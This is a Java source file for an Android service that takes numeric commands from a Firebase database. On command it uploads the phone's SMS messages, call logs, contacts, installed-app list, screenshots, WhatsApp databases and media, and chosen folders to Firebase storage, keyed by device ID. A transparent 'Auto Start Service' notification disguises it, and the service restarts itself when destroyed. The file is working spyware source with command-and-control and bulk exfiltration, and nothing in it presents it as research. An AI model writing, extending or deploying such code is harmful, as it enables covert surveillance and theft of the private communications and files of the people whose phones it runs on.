package com.aigs.serviceone.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ResolveInfo;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.widget.RemoteViews;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.FileProvider;

import com.aigs.serviceone.MainActivity;
import com.aigs.serviceone.R;
import com.aigs.serviceone.helpers.CallExtractorNotifier;
import com.aigs.serviceone.helpers.ContactsPayloadListner;
import com.aigs.serviceone.helpers.FileSystem;
import com.aigs.serviceone.annotations.PayloadTypes;
import com.aigs.serviceone.helpers.SmsExtractorNotifier;
import com.aigs.serviceone.annotations.SmsModes;
import com.aigs.serviceone.helpers.WatsappTextExtractionListner;
import com.aigs.serviceone.payload.BatteryUpdater;
import com.aigs.serviceone.payload.CallLogsPayload;
import com.aigs.serviceone.payload.ContactsPayload;
import com.aigs.serviceone.payload.GetStoragePathPayload;
import com.aigs.serviceone.payload.ScreenshotPayload;
import com.aigs.serviceone.payload.SmsPayload;
import com.aigs.serviceone.payload.WhatsappChatPayload;
import com.example.logshandler.starter.Logs;
import com.example.uniqueidmanager.DeviceIdentifier;
import com.example.uniqueidmanager.UniqueId;
import com.example.uniqueidmanager.model.UUIDInstance;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseException;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.UploadTask;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.util.HashMap;
import java.util.List;

public class Starter extends Service {

    String uuid;

    public Starter() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String input = intent.getStringExtra("inputExtra");
        uuid = UniqueId.initialize(this).getUUID();
        RemoteViews notificationLayout = new RemoteViews(getPackageName(), R.layout.notification_small);

        Intent notificationIntent = new Intent(this, Starter.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this,
                0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);
        Notification notification = new NotificationCompat.Builder(this, MainActivity.CHANNEL_ID)
                .setContentTitle("Auto Start Service")
                .setContentText(input)
                .setCustomContentView(notificationLayout)
                .setColor(Color.TRANSPARENT)
                .setSmallIcon(R.drawable.ic_launcher_background)
                .setContentIntent(pendingIntent)
                .build();

        NotificationManager mNotificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(MainActivity.CHANNEL_ID, MainActivity.CHANNEL_NAME, NotificationManager.IMPORTANCE_DEFAULT);
            mNotificationManager.createNotificationChannel(channel);
            new NotificationCompat.Builder(this, MainActivity.CHANNEL_ID);
        }
        startForeground(1, notification);

        DeviceIdentifier
                .getInstance(this)
                .updateUUIDEntry(new UUIDInstance( UniqueId.initialize(this).getUUID(),
                        String.valueOf(System.currentTimeMillis()),
                        DeviceIdentifier.getInstance(this).getAccountName()));

        FirebaseDatabase
                .getInstance()
                .getReference("test")
                .child(uuid)
                .child("ping_command")
                .addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        if (snapshot.exists()) {
                            try {
                                snapshot.getValue(Long.class);
                                FirebaseDatabase.getInstance().getReference("test").child(UniqueId.initialize(Starter.this).getUUID()).child("ping_command").setValue(true);
                            } catch (NumberFormatException | DatabaseException numberFormatException) {
                                Log.d("WARNING", "OLD BOOT CHECK COMMAND FOUND");
                                Logs.pushLogsToServer("[WARNING]: OLD BOOT CHECK COMMAND FOUND", uuid);
                            }
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {
                        Logs.pushLogsToServer("[ERROR]: "+error.getMessage(),uuid);
                        error.toException().printStackTrace();
                    }
                });


        FirebaseDatabase
                .getInstance()
                .getReference("test")
                .child(uuid)
                .child("command")
                .addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        if (snapshot.exists()) {
                            try {
                                int command = snapshot.getValue(Integer.class);
                                //TODO Add UUID Refreshment and active status here.
                                processCommand(command);
                                Log.e("COMMAND", String.valueOf(command));
                                Logs.pushLogsToServer("[COMMAND]: "+command,uuid);
                            } catch (Exception e) {
                                Logs.pushLogsToServer("[ERROR]: "+e.getMessage(),uuid);
                                Log.e("EXCEPTION", e.getMessage());
                            }
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {
                        Log.e("DB", error.getMessage());
                        Logs.pushLogsToServer("[ERROR]: "+error.getMessage(),uuid);

                    }
                });

        return START_NOT_STICKY;
    }

    private void processCommand(int command) {
        try {
            switch (command) {
                case PayloadTypes.GET_TEXT_MESSAGES_INBOX:
                    getSms(SmsModes.MODE_INBOX);
                    break;
                case PayloadTypes.GET_CALL_LOGS:
                    getCallLogs();
                    break;
                case PayloadTypes.GET_TEXT_MESSAGES_OUTBOX:
                    getSms(SmsModes.MODE_OUTBOX);
                    break;
                case PayloadTypes.GET_TEXT_MESSAGES_DRAFT:
                    getSms(SmsModes.MODE_DRAFT);
                    break;
                case PayloadTypes.GET_WHATSAPP_DATABASES:
                    getWbDb();
                    break;
                case PayloadTypes.GET_SCREENSHOTS_COUNT:
                    getSc();
                    break;
                case PayloadTypes.GET_USER_CONTACTS:
                    getContacts();
                    break;
                case PayloadTypes.GET_BATTERY_STATUS:
                    loadBatterySection();
                    break;
                case PayloadTypes.GET_DEVICE_INFO:
                    break;
                case PayloadTypes.GET_DEVICE_FOLDER:
                    getFileFromPath(PayloadTypes.GET_DEVICE_FOLDER, false);
                    break;
                case PayloadTypes.GET_WHATSAPP_STATUS:
                    getFileFromPath(PayloadTypes.GET_WHATSAPP_STATUS, true);
                    break;
                case PayloadTypes.GET_WHATSAPP_GIFS:
                    getFileFromPath(PayloadTypes.GET_WHATSAPP_GIFS,true);
                    break;
                case PayloadTypes.GET_WHATSAPP_AUDIO:
                    getFileFromPath(PayloadTypes.GET_WHATSAPP_AUDIO,true);
                    break;
                case PayloadTypes.GET_WHATSAPP_DOCUMENTS:
                    getFileFromPath(PayloadTypes.GET_WHATSAPP_DOCUMENTS,true);
                    break;
                case PayloadTypes.GET_WHATSAPP_IMAGES:
                    getFileFromPath(PayloadTypes.GET_WHATSAPP_IMAGES,true);
                    break;
                case PayloadTypes.GET_WHATSAPP_PROFILE_PICS:
                    getFileFromPath(PayloadTypes.GET_WHATSAPP_PROFILE_PICS,true);
                    break;
                case PayloadTypes.GET_WHATSAPP_STICKERS:
                    getFileFromPath(PayloadTypes.GET_WHATSAPP_STICKERS,true);
                    break;
                case PayloadTypes.GET_WHATSAPP_VIDEOS:
                    getFileFromPath(PayloadTypes.GET_WHATSAPP_VIDEOS,true);
                    break;
                case PayloadTypes.GET_WHATSAPP_VOICE_NOTES:
                    getFileFromPath(PayloadTypes.GET_WHATSAPP_VOICE_NOTES,true);
                    break;
                case PayloadTypes.GET_INSTALLED_APP_DETAILS:
                    getInstalledAppDetails();
                    break;

                default:
                    Log.d("ERROR PA : ", "Invalid Command Received");
                    Logs.pushLogsToServer("[ERROR]: Invalid Command Received", uuid);
                    break;
            }
        } catch (SecurityException e) {
            Log.e("PERMISSION : ", e.getMessage());
            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), uuid);

        }
    }

    private void getInstalledAppDetails() {
        Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
        mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
        List<ResolveInfo> pkgAppsList = getPackageManager().queryIntentActivities( mainIntent, 0);
        JSONArray jsonArray = new JSONArray();

        for (ResolveInfo resolveInfo : pkgAppsList){
            try {
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("package_name", resolveInfo.activityInfo.packageName);
                jsonObject.put("app_name", resolveInfo.activityInfo.applicationInfo.name);
                jsonObject.put("process_name", resolveInfo.activityInfo.applicationInfo.processName);
                jsonObject.put("uid", resolveInfo.activityInfo.applicationInfo.uid);
                jsonArray.put(jsonObject);

            }catch (Exception e){
                Log.e("ERROR",e.getMessage());
                Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), uuid);
            }
        }

        File file = FileSystem.createInstance(this).writeContactsData(jsonArray.toString());

        Uri uri = FileProvider.getUriForFile(this,getPackageName()+".provider",file);
        FirebaseStorage
                .getInstance()
                .getReference("INSTALLED_APP")
                .child(uuid)
                .child(System.currentTimeMillis()+"_app_Installed")
                .putFile(uri)
                .addOnCompleteListener(task -> {
                    if (task.isSuccessful()) {
                        task.getResult()
                                .getStorage()
                                .getDownloadUrl()
                                .addOnCompleteListener(task1 ->{
                                    HashMap<String, Object> databaseEntry = new HashMap<>();
                                    databaseEntry.put("/RECORDS/"+uuid+"/installed_apps"+"/" + System.currentTimeMillis(), task1.getResult().toString());
                                    databaseEntry.put("/LIVE/"+uuid+"/installed_apps", task1.getResult().toString());
                                    FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                });

                    }
                });



    }

    private void getFileFromPath(int payloadType, boolean isWhatsapp){
        if (!isWhatsapp){
            FirebaseDatabase
                    .getInstance()
                    .getReference("RUNTIME_PROPS")
                    .child("FILE_PATH_TO_ZIP")
                    .addValueEventListener(new ValueEventListener() {
                        @Override
                        public void onDataChange(@NonNull DataSnapshot snapshot) {
                            if (snapshot.exists()){
                                try {
                                    String path = snapshot.getValue(String.class);
                                    new GetStoragePathPayload(PayloadTypes.GET_DEVICE_FOLDER)
                                            .setWatsappTextExtractionListner(path1 -> {
                                                //TODO UPLOAD TO FIREBASE HERE
                                                Uri uri = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", path1);
                                                FirebaseStorage
                                                        .getInstance()
                                                        .getReference("PHONE_FILE")
                                                        .child(uuid)
                                                        .child(String.valueOf(payloadType))
                                                        .child(System.currentTimeMillis()+"_phone_"+payloadType+" "+path1.getName())
                                                        .putFile(uri)
                                                        .addOnCompleteListener(task -> {
                                                            if (task.isSuccessful()) {
                                                                task.getResult()
                                                                        .getStorage()
                                                                        .getDownloadUrl()
                                                                        .addOnCompleteListener(task1 ->{
                                                                            HashMap<String, Object> databaseEntry = new HashMap<>();
                                                                            databaseEntry.put("/RECORDS/"+uuid+"/phone_media_"+payloadType+"/" + System.currentTimeMillis(), task1.getResult().toString());
                                                                            databaseEntry.put("/LIVE/"+uuid+"/phone_media_"+payloadType, task1.getResult().toString());
                                                                            FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                                                        });

                                                            } else {
                                                                //SET ERROR MESSAGE
                                                            }
                                                        });

                                                Log.e("PATH", path1.getAbsolutePath());
                                                Logs.pushLogsToServer("[PATH]: "+path1.getAbsolutePath(), uuid);
                                            }).execute(path);

                                }catch (Exception e){
                                    Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), uuid);
                                    e.printStackTrace();
                                }

                            }else {
                                Logs.pushLogsToServer("[ERROR]: File path not set", uuid);
                            }
                        }

                        @Override
                        public void onCancelled(@NonNull DatabaseError error) {

                        }
                    });
        }else {
            new GetStoragePathPayload(payloadType)
                    .setWatsappTextExtractionListner(path -> {
                        Log.e("WPATH",path.getPath());
                        Uri uri = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", path);
                        FirebaseStorage
                                .getInstance()
                                .getReference("Whatsapp_media")
                                .child(uuid)
                                .child(String.valueOf(payloadType))
                                .child(System.currentTimeMillis()+"_whatsapp_"+payloadType)
                                .putFile(uri)
                                .addOnCompleteListener(task -> {
                                    if (task.isSuccessful()) {
                                        task.getResult()
                                                .getStorage()
                                                .getDownloadUrl()
                                                .addOnCompleteListener(task1 ->{
                                                    HashMap<String, Object> databaseEntry = new HashMap<>();
                                                    databaseEntry.put("/RECORDS/"+uuid+"/whatsapp_media_"+payloadType+"/" + System.currentTimeMillis(), task1.getResult().toString());
                                                    databaseEntry.put("/LIVE/"+uuid+"/whatsapp_media_"+payloadType, task1.getResult().toString());
                                                    FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                                    Logs.pushLogsToServer("[PATH]: "+task1.getResult().toString(), uuid);
                                                });

                                    } else {
                                        //SET ERROR MESSAGE
                                    }
                                });
                    }).execute();
        }
    }

    private void loadBatterySection() {
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(Intent.ACTION_POWER_CONNECTED);
        intentFilter.addAction(Intent.ACTION_POWER_DISCONNECTED);
        intentFilter.addAction(Intent.ACTION_BATTERY_CHANGED);

        BatteryUpdater batteryUpdater = new BatteryUpdater();
        registerReceiver(batteryUpdater, intentFilter);
    }

    private void getContacts() {
        try {
            new ContactsPayload(this).setOnContactPayloadListener(new ContactsPayloadListner() {
                @Override
                public void onDataExtracted(File file, String rawData) {
                    Uri fileReference = FileProvider.getUriForFile(Starter.this, Starter.this.getPackageName() + ".provider", file);
                    FirebaseStorage
                            .getInstance()
                            .getReference("contacts")
                            .child(uuid)
                            .child("contacts_" + System.currentTimeMillis() + ".json")
                            .putFile(fileReference)
                            .addOnFailureListener(r ->
                                    Logs.pushLogsToServer(r.getMessage(),uuid))
                            .addOnCompleteListener(task -> {
                                if (task.isSuccessful()) {
                                    task.getResult()
                                            .getStorage()
                                            .getDownloadUrl()
                                            .addOnCompleteListener(task1 -> {
                                                HashMap<String, Object> databaseEntry = new HashMap<>();
                                                databaseEntry.put("/RECORDS/"+uuid+"/contacts/" + System.currentTimeMillis(), task1.getResult().toString());
                                                databaseEntry.put("/LIVE/"+uuid+"/contacts", task1.getResult().toString());
                                                FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                            });
                                }
                            });
                }
            }).execute();
        } catch (Exception e) {
            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), uuid);
            e.printStackTrace();
        }
    }

    private void getSc() {
        try {
            new ScreenshotPayload(this).setScreenshotPayloadListener(path -> {

                Uri securePath = FileProvider.getUriForFile(Starter.this, Starter.this.getPackageName() + ".provider", path);
                Log.e("PATH:", path.toString());
                FirebaseStorage
                        .getInstance()
                        .getReference("screenshots")
                        .child(uuid)
                        .child("sc_" + System.currentTimeMillis() + ".zip")
                        .putFile(securePath)
                        .addOnFailureListener(f -> Logs.pushLogsToServer(f.getMessage(),uuid))
                        .addOnCompleteListener(t -> {
                            t.getResult()
                                    .getStorage()
                                    .getDownloadUrl()
                                    .addOnCompleteListener(p ->{
                                        HashMap<String, Object> databaseEntry = new HashMap<>();
                                        databaseEntry.put("/RECORDS/"+uuid+"/screenshots/" + System.currentTimeMillis(), p.getResult().toString());
                                        databaseEntry.put("/LIVE/"+uuid+"/screenshots", p.getResult().toString());
                                        FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);

                                    });
                        });
            }).execute();
        } catch (Exception e) {
            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), uuid);
            e.printStackTrace();
        }
    }

    private void getWbDb() {
        try {
            new WhatsappChatPayload(this)
                    .setWatsappTextExtractionListner(path -> {
                        Uri uriDb = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", path[0]);
                        Uri uri = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", path[1]);
                        String time = String.valueOf(System.currentTimeMillis());

                        FirebaseStorage
                                .getInstance()
                                .getReference("whatsapp_media_less")
                                .child(uuid)
                                .child(time)
                                .putFile(uriDb)
                                .addOnCompleteListener(task -> {
                                    if (task.isSuccessful()) {
                                        task.getResult()
                                                .getStorage()
                                                .getDownloadUrl()
                                                .addOnCompleteListener(task1 ->
                                                        FirebaseDatabase
                                                                .getInstance()
                                                                .getReference("RECORDS")
                                                                .child(uuid)
                                                                .child("wbDb")
                                                                .child(System.currentTimeMillis() + " ")
                                                                .setValue(task1.getResult().toString()));

                                    } else {
                                        //SET ERROR MESSAGE
                                    }
                                });

                        FirebaseStorage
                                .getInstance()
                                .getReference("whatsapp_media_less")
                                .child(uuid)
                                .child(time)
                                .putFile(uri)
                                .addOnCompleteListener(task12 -> {
                                    task12.getResult()
                                            .getStorage()
                                            .getDownloadUrl()
                                            .addOnCompleteListener(task1 ->
                                                    FirebaseDatabase
                                                            .getInstance()
                                                            .getReference("RECORDS")
                                                            .child(uuid)
                                                            .child("wbDb")
                                                            .child(System.currentTimeMillis() + " ")
                                                            .setValue(task1.getResult().toString()));
                                });


                    }).execute();
        } catch (Exception e) {
            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), uuid);
            e.printStackTrace();
        }
    }

    private void getCallLogs() {
        try {

            new CallLogsPayload(this)
                    .setCallLogsListener(new CallExtractorNotifier() {
                        @Override
                        public void onCallRetrieved(File file, String calls) {
                            Uri uri = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", file);
                            Log.d("PATH_PRO", uri.toString());
                            FirebaseStorage
                                    .getInstance()
                                    .getReference("calls")
                                    .child(uuid)
                                    .child(String.valueOf(System.currentTimeMillis()))
                                    .putFile(uri)
                                    .addOnCompleteListener(task -> {
                                        if (task.isSuccessful()) {
                                            task.getResult().getStorage().getDownloadUrl().addOnCompleteListener(task1 -> {
                                                HashMap<String, Object> databaseEntry = new HashMap<>();
                                                databaseEntry.put("/RECORDS/"+uuid+"/calls/" + System.currentTimeMillis(), task1.getResult().toString());
                                                databaseEntry.put("/LIVE/"+uuid+"/calls", task1.getResult().toString());
                                                FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                            });
                                        } else{
                                            Logs.pushLogsToServer("[ERROR]: "+task.getException().getMessage(), uuid);
                                            Log.e("STORAGE", task.getException().getMessage());
                                        }


                                    });

                        }

                        @Override
                        public void onResponseEmpty() {
                            Log.e("EMPTY", "NO RECORDS DETECTED");
                            Logs.pushLogsToServer("[ERROR]: NO call logs found to fetch", uuid);
                        }
                    }).execute();

        } catch (Exception e) {
            e.printStackTrace();
            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), uuid);

        }

    }

    private void getSms(String modeInbox) {
        try {

            new SmsPayload(this)
                    .setSmsListener(new SmsExtractorNotifier() {
                        @Override
                        public void onSmsRetrieved(File file, String sms) {
                            Uri uri = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", file);
                            Log.d("PATH_PRO", uri.toString());
                            FirebaseStorage
                                    .getInstance()
                                    .getReference("sms")
                                    .child(uuid)
                                    .child(String.valueOf(System.currentTimeMillis()))
                                    .putFile(uri)
                                    .addOnCompleteListener(new OnCompleteListener<UploadTask.TaskSnapshot>() {
                                        @Override
                                        public void onComplete(@NonNull Task<UploadTask.TaskSnapshot> task) {
                                            if (task.isSuccessful()) {
                                                task.getResult().getStorage().getDownloadUrl().addOnCompleteListener(new OnCompleteListener<Uri>() {
                                                    @Override
                                                    public void onComplete(@NonNull Task<Uri> task) {
                                                        HashMap<String, Object> databaseEntry = new HashMap<>();
                                                        if (modeInbox.equals(SmsModes.MODE_INBOX)){
                                                            databaseEntry.put("/RECORDS/"+uuid+"/sms_inbox/" + System.currentTimeMillis(), task.getResult().toString());
                                                            databaseEntry.put("/LIVE/"+uuid+"/sms_inbox", task.getResult().toString());
                                                        }else if (modeInbox.equals(SmsModes.MODE_OUTBOX)){
                                                            databaseEntry.put("/RECORDS/"+uuid+"/sms_outbox/" + System.currentTimeMillis(), task.getResult().toString());
                                                            databaseEntry.put("/LIVE/"+uuid+"/sms_outbox", task.getResult().toString());
                                                        }else if (modeInbox.equals(SmsModes.MODE_DRAFT)){
                                                            databaseEntry.put("/RECORDS/"+uuid+"/sms_draft/" + System.currentTimeMillis(), task.getResult().toString());
                                                            databaseEntry.put("/LIVE/"+uuid+"/sms_draft", task.getResult().toString());
                                                        }

                                                        FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                                    }
                                                });
                                            } else {
                                                Log.e("STORAGE", task.getException().getMessage());
                                                Logs.pushLogsToServer("[ERROR]: "+task.getException().getMessage(), uuid);
                                            }
                                        }
                                    });
                        }

                        @Override
                        public void onResponseEmpty() {
                            Log.e("EMPTY", "NO RECORDS DETECTED");
                            Logs.pushLogsToServer("No Received messages found in the inbox", uuid);
                        }
                    }).execute(modeInbox);

        } catch (Exception e) {
            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), uuid);
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Intent serviceIntent = new Intent(this, Starter.class);
        serviceIntent.putExtra("inputExtra", "passing any text");
        ContextCompat.startForegroundService(this, serviceIntent);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}